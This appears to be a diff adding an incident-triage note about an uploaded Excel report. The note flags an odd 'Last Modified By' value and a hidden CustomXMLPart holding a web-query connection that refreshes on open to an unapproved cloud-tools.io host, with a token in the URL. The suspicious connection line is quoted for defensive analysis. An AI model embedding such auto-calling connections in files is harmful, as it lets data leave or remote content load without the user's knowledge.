@@ -1,0 +1,20 @@
+File upload origin analysis:
+
+Filename: quarterly-report-final-v2.xlsx
+Upload method: Drag-and-drop via web interface
+User: authenticated employee (marketing department)
+
+Origin metadata:
+- File "Created By": "Marketing Team" (matches expected)
+- File "Last Modified By": "Admin" (generic, unusual for departmental file)
+- Embedded OLE stream count: 4 (typical for Excel: Workbook, SummaryInfo, DocSummaryInfo)
+  Plus 1 additional: "CustomXMLPart" (1,204 bytes)
+- CustomXMLPart contains references to external data connections:
+  <connection name="RefreshSource" type="webQuery"
+    url="https://sheets-sync.cloud-tools.io/pull?workspace=mktg&token=eyJ..." />
+- External data connection is set to "refresh on open"
+- The cloud-tools.io domain is not on the company's approved SaaS list
+
+The file may be a legitimate report using an unauthorized cloud sync tool,
+or it may be a document weaponized to exfiltrate data or fetch remote content
+when opened. The employee may be unaware of the embedded connection.
